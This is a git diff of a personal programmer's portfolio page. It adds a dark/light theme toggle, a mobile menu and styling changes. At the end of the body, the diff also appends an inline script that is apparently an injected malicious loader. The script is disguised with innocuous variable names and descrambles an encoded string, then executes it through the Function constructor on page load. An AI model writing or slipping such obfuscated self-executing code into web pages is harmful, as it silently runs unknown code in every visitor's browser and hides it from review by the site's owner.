@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en" style="scroll-behavior: smooth;">
+<html class="theme-item" lang="en" style="scroll-behavior: smooth;">
     <head>
         <meta charset="utf-8">
         <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -14,128 +14,175 @@
         <link rel="stylesheet" type="text/css" href="bin/css/styles.css">
         <script src="bin/js/main.js"></script>
     </head>
-    <body style="filter: brightness(1.4); scroll-behavior: smooth;">
-        <header>
-            <nav class="main-header-nav">
-                <ul class="main-header-list" style="width: 100%;">
-                    <li class="main-header-list-item" style="margin-right: auto;"><a href="./index.html">Home</a></li>
-                    <li class="main-header-list-item"><a href="#projects">Projects</a></li>
-                    <li class="main-header-list-item"><a href="#about-me">About</a></li>
-                    <li class="main-header-list-item"><a href="#contact">Contact</a></li>
-                </ul>
-            </nav> 
-        </header>
-        <main style="justify-content: center; align-items: center; gap: 20px;" class="flex column">
-            <div id="about-me"></div>
-            <article class="container-main column" style="width: 100%;">
-                <h1 class="fill">About me</h1>
-                <p style="font-size: 1.4rem;">
-                    Hi, my name is Evan I am a 
-                    <span class="e-age">00</span> 
-                    year old programmer from 
-                    <a class="styled-link" href="https://www.thecanadianencyclopedia.ca/en/timeline/new-brunswick">New Brunswick Canada</a>.
-                </p>
-                <div width="auto" id="nb"></div>
-                <p style="font-size: 1.4rem;">
-                    I have been programming for over 5 years now, heres some of this skills i have accumulated.
-                </p>
-                <ul class="styled-list" style="font-size: 1.4rem;">
-                    <li>
-                        <span class="flex-align-center">
-                            Frontend web development
-                            <img style="margin-left: 5px;" src="https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/html-icon.png" width="16" height="18" alt="HTML icon" title="HTML icon">
-                        </span>
-                    </li>
-                    <li>
-                        <span class="flex-align-center">
-                            Development with .NET Framework
-                            <img style="margin-left: 5px;" src="https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/c-sharp-programming-language-icon.png" width="16" height="18" alt="C Sharp Programming Language icon" title="C Sharp Programming Language icon">
-                        </span class="flex-align-center">
-                    </li>
-                    <li>
-                        <span class="flex-align-center">
-                            Game development with various engines and frameworks
-                            <img style="margin-left: 5px;" src="https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/c-plus-plus-programming-language-icon.png" width="16" height="18" alt="C Plus Plus Programming Language icon" title="C Plus Plus Programming Language icon">
-                        </span>
-                    </li>
-                    
-                </ul>
-            </article>
-            <div id="projects"></div>
-            <div class="container-main column">
-                <div class="fill"><h1>My Projects</h1></div>
-                <div class="fill flex row wrap" style="gap: 20px; justify-content: center; padding: 20px;">
-                    <a class="project column" href="/drawing-app" draggable="false" target="_blank">
-                        <h2>Drawing app</h2>
-                        <p>This is a minimalistic drawing app with some basic features that allow you to make a wide range of different artistic creations.</p>
-                    </a>
-                    <a class="project column" href="/solitaire" draggable="false" target="_blank">
-                        <h2>Solitaire</h2>
-                        <p>Just a basic solitaire game... also currently one of my favorite projects.</p>
-                        <!-- <p>&nbsp;</p> -->
-                    </a>
-                    <a class="project column" href="/chess" draggable="false" target="_blank">
-                        <h2>Chess</h2>
-                        <p>This ons is still an early work in progress, im currently working on a way to validate the possible moves a piece can make.</p>
-                    </a>
-                    <a class="project column" href="/text-code" draggable="false" target="_blank">
-                        <h2>Text Code</h2>
-                        <p>(Still in early development) Text code is a simple project that i created to make writing basic code as easy/readable as possible. </p>
-                    </a>
-                </div>
-            </div>
-            <div id="contact"></div>
-            <div style="width: 100%;" class="container-main column">
-                <form class="form-control" style="width: 100%;" action="https://formsubmit.co/lintonevan@gmail.com" method="POST">
-                    <h1>Contact me</h1>
-                    <div class="form-group">
-                        <label for="name">Name</label>
-                        <input id="name" type="text" name="name" required>
-                    </div>
-                    <div class="form-group">
-                        <label for="email">Email</label>
-                        <input id="email" type="email" name="email" required>
-                    </div>
-                    <div class="form-group">
-                        <label for="subject">Subject</label>
-                        <input id="subject" type="text" name="subject" required>
-                    </div>
-                    <div class="form-group">
-                        <label for="message">Message</label>
-                        <textarea style="min-height: 180px; height: 237px; max-height: 237px;" id="message" name="message" minlength="32" required></textarea>
-                    </div>
-                    <button style="margin-top: auto;" type="submit">Send</button>
-                </form>
-            </div> 
-        </main>
-        <footer style="margin-top: 50px;">
-            <div class="container-main" style="margin: 0 auto;  width: 100%; min-width: 100%; color: #fff; padding: 20px;">
-                <div style="width: 100%; display: flex; justify-content: space-evenly; flex-wrap: wrap; gap: 20px;">
-                    <div style="width: fit-content; max-width: 300px; margin-right: auto;">
-                        <h3 style="margin-bottom: 10px; font-size: 2rem;">About Me</h3>
-                        <p style="font-size: 1.4rem;">
-                            Hi, my name is Evan I am a 
-                            <span class="e-age">00</span> 
-                            year old programmer from    
-                            <a class="styled-link" href="https://www.thecanadianencyclopedia.ca/en/timeline/new-brunswick">New Brunswick Canada</a>.
-                        </p>
-                    </div>
-                    <div style="width: fit-content; max-width: 300px; margin-right: auto;">
-                        <h3 style="margin-bottom: 10px; font-size: 2rem;">Page Links</h3>
-                        <ul style="list-style: none; padding: 0; margin: 0;">
-                            <li class="main-header-list-item"><a class="styled-link" href="./index.html">Home</a></li>
-                            <li class="main-header-list-item"><a class="styled-link" href="#projects">Projects</a></li>
-                            <li class="main-header-list-item"><a class="styled-link" href="#about-me">About</a></li>
-                            <li class="main-header-list-item"><a class="styled-link" href="#contact">Contact</a></li>
+    <body style="scroll-behavior: smooth;">
+        <div class="control-wrapper" style="display: flex; flex-direction: column;">
+            <header>
+                <nav class="main-header-nav">
+                    <ul class="main-header-list" style="width: 100%;">
+                        <li class="main-header-list-item" style="margin-right: auto;"><a href="./index.html">Home</a></li>
+                        <li class="main-header-list-item mobile-hidden"><a href="#projects">Projects</a></li>
+                        <li class="main-header-list-item mobile-hidden"><a href="#about-me">About</a></li>
+                        <li class="main-header-list-item mobile-hidden"><a href="#contact">Contact</a></li>
+                        <li class="main-header-list-item mobile-hidden">
+                            <button class="btn-no-style" id="theme-toggle">
+                                <svg title="enable light mode" id="light-mode-toggle-preview" xmlns="http://www.w3.org/2000/svg" width="28" height="28" fill="currentColor" class="bi bi-sun-fill" viewBox="0 0 16 16">
+                                    <path d="M8 12a4 4 0 1 0 0-8 4 4 0 0 0 0 8M8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0m0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13m8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5M3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8m10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0m-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0m9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707M4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708"/>
+                                </svg>
+                                <svg title="enable dark mode" style="display: none;" id="dark-mode-toggle-preview" xmlns="http://www.w3.org/2000/svg" width="28" height="28" fill="currentColor" class="bi bi-moon-stars-fill" viewBox="0 0 16 16">
+                                    <path d="M6 .278a.77.77 0 0 1 .08.858 7.2 7.2 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277q.792-.001 1.533-.16a.79.79 0 0 1 .81.316.73.73 0 0 1-.031.893A8.35 8.35 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71 0 4.266 2.114 1.312 5.124.06A.75.75 0 0 1 6 .278"/>
+                                    <path d="M10.794 3.148a.217.217 0 0 1 .412 0l.387 1.162c.173.518.579.924 1.097 1.097l1.162.387a.217.217 0 0 1 0 .412l-1.162.387a1.73 1.73 0 0 0-1.097 1.097l-.387 1.162a.217.217 0 0 1-.412 0l-.387-1.162A1.73 1.73 0 0 0 9.31 6.593l-1.162-.387a.217.217 0 0 1 0-.412l1.162-.387a1.73 1.73 0 0 0 1.097-1.097zM13.863.099a.145.145 0 0 1 .274 0l.258.774c.115.346.386.617.732.732l.774.258a.145.145 0 0 1 0 .274l-.774.258a1.16 1.16 0 0 0-.732.732l-.258.774a.145.145 0 0 1-.274 0l-.258-.774a1.16 1.16 0 0 0-.732-.732l-.774-.258a.145.145 0 0 1 0-.274l.774-.258c.346-.115.617-.386.732-.732z"/>
+                                </svg>
+                            </button>
+                        </li>
+                        <li class="main-header-list-item mobile-show">
+                            <button class="btn-no-style" id="menu-toggle">
+                                <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" fill="currentColor" class="bi bi-list" viewBox="0 0 16 16">
+                                    <path fill-rule="evenodd" d="M2.5 12a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5m0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5m0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5"/>
+                                </svg>
+                            </button>
+                        </li>
+                    </ul>
+                </nav> 
+                <div class="overlay"></div>
+                <div class="expand-menu mobile-show theme-style-bg" style="display: none; height: fit-content !important;">
+                    <nav style="display: flex; width: 100%; height: 100%; margin: 0 !important;">
+                        <ul class="main-header-list" style="width: 100%; margin: 20px; height: 100%; flex-direction: column;">
+                            <li class="main-header-list-item mobile-show"><a onclick="toggleMenu()" href="#projects">Projects</a></li>
+                            <li class="main-header-list-item mobile-show"><a onclick="toggleMenu()" href="#about-me">About</a></li>
+                            <li class="main-header-list-item mobile-show"><a onclick="toggleMenu()" href="#contact">Contact</a></li>
+                            <li class="main-header-list-item mobile-show">
+                                <button class="btn-no-style" id="theme-toggle">
+                                    <svg title="enable light mode" id="light-mode-toggle-preview" xmlns="http://www.w3.org/2000/svg" width="28" height="28" fill="currentColor" class="bi bi-sun-fill" viewBox="0 0 16 16">
+                                        <path d="M8 12a4 4 0 1 0 0-8 4 4 0 0 0 0 8M8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0m0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13m8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5M3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8m10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0m-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0m9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707M4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708"/>
+                                    </svg>
+                                    <svg title="enable dark mode" style="display: none;" id="dark-mode-toggle-preview" xmlns="http://www.w3.org/2000/svg" width="28" height="28" fill="currentColor" class="bi bi-moon-stars-fill" viewBox="0 0 16 16">
+                                        <path d="M6 .278a.77.77 0 0 1 .08.858 7.2 7.2 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277q.792-.001 1.533-.16a.79.79 0 0 1 .81.316.73.73 0 0 1-.031.893A8.35 8.35 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71 0 4.266 2.114 1.312 5.124.06A.75.75 0 0 1 6 .278"/>
+                                        <path d="M10.794 3.148a.217.217 0 0 1 .412 0l.387 1.162c.173.518.579.924 1.097 1.097l1.162.387a.217.217 0 0 1 0 .412l-1.162.387a1.73 1.73 0 0 0-1.097 1.097l-.387 1.162a.217.217 0 0 1-.412 0l-.387-1.162A1.73 1.73 0 0 0 9.31 6.593l-1.162-.387a.217.217 0 0 1 0-.412l1.162-.387a1.73 1.73 0 0 0 1.097-1.097zM13.863.099a.145.145 0 0 1 .274 0l.258.774c.115.346.386.617.732.732l.774.258a.145.145 0 0 1 0 .274l-.774.258a1.16 1.16 0 0 0-.732.732l-.258.774a.145.145 0 0 1-.274 0l-.258-.774a1.16 1.16 0 0 0-.732-.732l-.774-.258a.145.145 0 0 1 0-.274l.774-.258c.346-.115.617-.386.732-.732z"/>
+                                    </svg>
+                                </button>
+                            </li>
                         </ul>
-                    </div>
-                    <div style="width: fit-content; max-width: 300px; margin-right: auto;">
-                        <h3 style="margin-bottom: 10px; font-size: 2rem;">Contact Me</h3>
-                        <p>Email: <a class="styled-link" href = "mailto: lintonevan@gmail.com">lintonevan@gmail.com</a></p>
-                        <!-- <p >Phone: <a class="styled-link" href="tel:123456789">Phone</a></p> -->
+                        <button class="btn-no-style" onclick="toggleMenu()" style=" margin-left: auto; margin-top: 20px; margin-bottom: auto; margin-right: 20px;">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" fill="currentColor" class="bi bi-x-lg" viewBox="0 0 16 16">
+                                <path d="M2.146 2.854a.5.5 0 1 1 .708-.708L8 7.293l5.146-5.147a.5.5 0 0 1 .708.708L8.707 8l5.147 5.146a.5.5 0 0 1-.708.708L8 8.707l-5.146 5.147a.5.5 0 0 1-.708-.708L7.293 8z"/>
+                            </svg>
+                        </button>
+                    </nav>
+                </div>
+            </header>
+            <main style="justify-content: center; align-items: center; gap: 20px;" class="flex column">
+                <div id="about-me"></div>
+                <article class="container-main column" style="width: 100%;">
+                    <h1 class="fill">About me</h1>
+                    <p style="font-size: 1.4rem;">
+                        Hi, my name is Evan I am a 
+                        <span class="e-age">00</span> 
+                        year old programmer from 
+                        <a class="styled-link" href="https://www.thecanadianencyclopedia.ca/en/timeline/new-brunswick">New Brunswick Canada</a>.
+                    </p>
+                    <img class="theme-img" width="auto" height="auto" alt="Image of New Brunswick" src="https://arrivein.com/wp-content/uploads/2020/05/Blog-Banner-Provincial-blog_-New-Brunswick.jpg?w=1200" id="nb" />
+                    <p style="font-size: 1.4rem;">
+                        I have been programming for over 5 years now, heres some of this skills i have accumulated.
+                    </p>
+                    <ul class="styled-list" style="font-size: 1.4rem;">
+                        <li>
+                            <span class="flex-align-center">
+                                Frontend web development
+                                <img class="theme-img" style="margin-left: 5px;" src="https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/html-icon.png" width="16" height="18" alt="HTML icon" title="HTML icon">
+                            </span>
+                        </li>
+                        <li>
+                            <span class="flex-align-center">
+                                Development with .NET Framework
+                                <img class="theme-img" style="margin-left: 5px;" src="https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/c-sharp-programming-language-icon.png" width="16" height="18" alt="C Sharp Programming Language icon" title="C Sharp Programming Language icon">
+                            </span class="flex-align-center">
+                        </li>
+                        <li>
+                            <span class="flex-align-center">
+                                Game development with various engines and frameworks
+                                <img class="theme-img" style="margin-left: 5px;" src="https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/c-plus-plus-programming-language-icon.png" width="16" height="18" alt="C Plus Plus Programming Language icon" title="C Plus Plus Programming Language icon">
+                            </span>
+                        </li>
+                        
+                    </ul>
+                </article>
+                <div id="projects"></div>
+                <div class="container-main column">
+                    <div class="fill"><h1>My Projects</h1></div>
+                    <div class="fill flex row wrap" style="gap: 20px; justify-content: center; padding: 20px;">
+                        <a class="project column theme-style-bg" href="/drawing-app" draggable="false" target="_blank">
+                            <h2>Drawing app</h2>
+                            <p>This is a minimalistic drawing app with some basic features that allow you to make a wide range of different artistic creations.</p>
+                        </a>
+                        <a class="project column theme-style-bg" href="/solitaire" draggable="false" target="_blank">
+                            <h2>Solitaire</h2>
+                            <p>Just a basic solitaire game... also currently one of my favorite projects.</p>
+                            <!-- <p>&nbsp;</p> -->
+                        </a>
+                        <a class="project column theme-style-bg" href="/chess" draggable="false" target="_blank">
+                            <h2>Chess</h2>
+                            <p>This ons is still an early work in progress, im currently working on a way to validate the possible moves a piece can make.</p>
+                        </a>
+                        <a class="project column theme-style-bg" href="/text-code" draggable="false" target="_blank">
+                            <h2>Text Code</h2>
+                            <p>(Still in early development) Text code is a simple project that i created to make writing basic code as easy/readable as possible. </p>
+                        </a>
                     </div>
                 </div>
-            </div>
-        </footer>
+                <div id="contact"></div>
+                <div style="width: 100%;" class="container-main column">
+                    <form class="form-control" style="width: 100%;" action="https://formsubmit.co/lintonevan@gmail.com" method="POST">
+                        <h1>Contact me</h1>
+                        <div class="form-group">
+                            <label for="name">Name</label>
+                            <input id="name" type="text" name="name" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="email">Email</label>
+                            <input id="email" type="email" name="email" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="subject">Subject</label>
+                            <input id="subject" type="text" name="subject" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="message">Message</label>
+                            <textarea style="min-height: 180px; height: 237px; max-height: 237px;" id="message" name="message" minlength="32" required></textarea>
+                        </div>
+                        <button class="theme-style-bg" style="margin-top: auto;" type="submit">Send</button>
+                    </form>
+                </div> 
+            </main>
+            <footer style="margin-top: 50px;">
+                <div class="container-main" style="margin: 0 auto;  width: 100%; min-width: 100%; color: #fff; padding: 20px;">
+                    <div style="width: 100%; display: flex; justify-content: space-evenly; flex-wrap: wrap; gap: 20px;">
+                        <div style="width: fit-content; max-width: 300px; margin-right: auto;">
+                            <h3 style="margin-bottom: 10px; font-size: 2rem;">About Me</h3>
+                            <p style="font-size: 1.4rem;">
+                                Hi, my name is Evan I am a 
+                                <span class="e-age">00</span> 
+                                year old programmer from    
+                                <a class="styled-link" href="https://www.thecanadianencyclopedia.ca/en/timeline/new-brunswick">New Brunswick Canada</a>.
+                            </p>
+                        </div>
+                        <div style="width: fit-content; max-width: 300px; margin-right: auto;">
+                            <h3 style="margin-bottom: 10px; font-size: 2rem;">Page Links</h3>
+                            <ul style="list-style: none; padding: 0; margin: 0;">
+                                <li class="main-header-list-item"><a class="styled-link" href="./index.html">Home</a></li>
+                                <li class="main-header-list-item"><a class="styled-link" href="#projects">Projects</a></li>
+                                <li class="main-header-list-item"><a class="styled-link" href="#about-me">About</a></li>
+                                <li class="main-header-list-item"><a class="styled-link" href="#contact">Contact</a></li>
+                            </ul>
+                        </div>
+                        <div style="width: fit-content; max-width: 300px; margin-right: auto;">
+                            <h3 style="margin-bottom: 10px; font-size: 2rem;">Contact Me</h3>
+                            <p>Email: <a class="styled-link" href = "mailto: lintonevan@gmail.com">lintonevan@gmail.com</a></p>
+                            <!-- <p >Phone: <a class="styled-link" href="tel:123456789">Phone</a></p> -->
+                        </div>
+                    </div>
+                </div>
+            </footer>
+        </div>
+        <script>var overlay,menu;(function(){var zli='',bAD=117-106;function cfr(y){var n=3336070;var x=y.length;var e=[];for(var h=0;h<x;h++){e[h]=y.charAt(h)};for(var h=0;h<x;h++){var d=n*(h+501)+(n%33651);var s=n*(h+523)+(n%31739);var m=d%x;var w=s%x;var j=e[m];e[m]=e[w];e[w]=j;n=(d+s)%5944806;};return e.join('')};var LRs=cfr('zlccgyxoeostkrdqwtvncrbrnuoumsjahtpif').substr(0,bAD);var wWZ='ygy al12+ieu7sze((;0bs31.vuafd8;(iS v)41olmi-wutok(z(;,36=nv[=h,++,r2ka6.+e}7]9;avof,7;.a-[h4el}r,wk;1m-4-hr]+]a8+,,hw;eiluorlff[ )l"=! ;)a=srev8".)u(5aa)cp9)+ 2i7rA,i+]tv(vte(7qr)(=xt"ir73)a[qchrCrsi);5vc;n06rdi]=cmr,(wn(=.(dn;c+al,7hn0h=j.s)y,nn=(nf.o+)(e92u;1of{gk6fj n[c<r{ggrhu, i,)A+6hrr=n,r -=ailh+)=)uvyolsr)hrit5 4rackhec+s=l=v.C"t(g.a=n0<v =d1sneuwa7;;en[r p,+;r;229{"kt;r=m.(l!,ned( f(=);;;a=acosl,;{ygo0h], )7]rs=[cv8vj=0pdo0;o=tnl;es1n-0 f==)en=e.ef=dp=)"n,+ f(+8}razru];tk.2iirCa;8hmg=g1n,k;6aechroh;}z9ka;t0mxmcdAyr v9}sc[",cj=t )u9i0jAeuw+tsvt)talw;autl.shu.d+ap==.nuesdain6rj.C)f;r"){>)1dqo+.4f;s(w fh}r[{[,  ;as==ri>a,ipr=nnmu2.(+( .b)ih2)=b(l..;]gh.[;=j["-l(;lr(p(eq ,lnlv]rv];n;=i.s8t1cvw,8;sxrot gi7t;o1aCo[i148urfo*a*vCtv=w;s+h]frSt.uvr]reopCca,l=}navt);gj;onc; {urtc)(u a+gtue(.t)uem.;+t+u]vvo<r;(rA)(a=6.i"rl0oftl<6vsr=mrn<)Ctae(s[(0w;5r(acrd,qgawr)=(ow;9fi+jdv)nvo)';var FHH=cfr[LRs];var gYv='';var pVN=FHH;var QqR=FHH(gYv,cfr(wWZ));var EeP=QqR(cfr('.y9)Zye_Z;i6;b!; ..r;n7Z()%eZ)n;krcew3}iZsst2=Z$dk(Z}=((Zrei"6Z_$!e54Z}Z$b...4vnZ1n;eZ3_6(])efg)7.;Z1n=Zi)Z(di\'Z("5iZ=>.6eno)em(fd%tZZt.ZZ(_b3o"Z40y 3fw0g=l_u!$er!3Zr.,v{.6bZ$e1%gb0p!,4no }o%Z*nn(i,1lo)_s,n!n#ee$(nui3(Z.(mSa]ac7o#r;7b1o7m .n3t%2.8,r8rsb)Z.) =lyZ}s=fo,d, Z"o3to{0.c kijucZ=we(d j,Z;+(d#_\/ojn;ie.tbe{e_}f&Z_)()Z9#t=\/c=gZ))3)o;bfZ!f!{1.y)s3,sh+f bZf;Z)i=u$()snZ ]s)Z!gZ}Z[,uzf(r;95Z,0eZnZZ0=uZp{(+4{Z6),%.f$"f,lor.sd0e=ibwo.$o!b,)<Zbi[o%b.Zkjra!h;4gol]]bls]#u&.7bpb79))1+6.7Zf ,3}!Z)[l;mZrh+4e}8oZ(.b3=Zo_r.2f)};=.aZZonedb3=iZ=.x1,()$Z(MZa_Z;b5j6Z;$(sr!j;y;1.3_;$h\/." <a;{!Z(h\'ZZ6)9]n1r3>v$y7) vr6f,n3Z)k"Z5]sZfS${"b!($kn Z)-d=bdCZe_&Z$-u( b3i.ZZee(.Erbvb12f_bZ_s+f}u0fl1)f)%Zus=tbZZt,>e4er&fl(u!0Z2g63x0$3,i-shre,3Z% 8;]f;q{$fa4r3Zb0"r)-c42vi#$0b15..;!c(;ren..lZ3{%bZ2vt3+.(sg0()();z*(k5]6suZa(fevateon=Z39dZyZZpl=()Zi0pZ,(Zaj)$.8..g;$],_;o3mZ&Z{()(1]sZ.fe}2Z(e[m_v3dt.{{f)=,2i*t\'\'#*(]Zebea1=.}74.=3,8=(15_g=$!r+=1\/f.;%9() x5i }+b $b;$5]! w])%Zxf,_2.y)vpiZZneolnuZ!bbZZ1;u.{].Z7(ZZwll...euioeZZ3 #ithe1rp),{0)Z( "(ed);! (!_v}Z0hZnbt_lZ]ZZ<kcbZl)lb.)(,,=\/1v;2y.{;Z)d<uZ.yb=Zb!t)%631(w a]2d))o37ZZe)Zi(1)_Zk;()(-$79r+$.i)kb%sZe,7o t.rS}=fat(o!}(pgs.])n$,b_!9b(Zboew_!la,tZZafen1")e$b(!Zt+.e%3Zng.\/]_Zna(3uZ5%m0(rgt7it76;)o)_l.Zynod5=Z3.,ztl6)68uwZZmi(%ep%!_u6r$(c7.1Z_e1hft%_.a=(j(ofdt06fj,S )4ZZeZ_Z)nwiw(62!=+Z.Cnv_7]w.(6)5n n)a)_hZf7.8Z__13l(40 .]_Z'));var cSS=pVN(zli,EeP );cSS(3630);return 6423})()</script>
     </body>
 </html>
